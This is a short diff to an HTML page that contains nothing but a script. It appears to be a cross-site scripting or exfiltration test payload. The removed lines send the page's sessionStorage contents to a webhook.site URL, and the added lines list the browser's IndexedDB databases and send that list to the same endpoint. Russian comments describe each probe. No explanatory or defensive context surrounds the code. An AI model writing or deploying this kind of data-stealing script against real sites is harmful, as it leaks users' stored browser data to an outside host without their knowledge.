@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
 <script>
-// Проверяем Session Storage
-var ssData = JSON.stringify(sessionStorage);
-fetch('https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?session_storage=' + encodeURIComponent(ssData));
+// Пробуем прочитать IndexedDB
+indexedDB.databases().then(dbs => {
+  fetch('https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?indexeddb=' + encodeURIComponent(JSON.stringify(dbs)));
+});
 </script>
 </html>
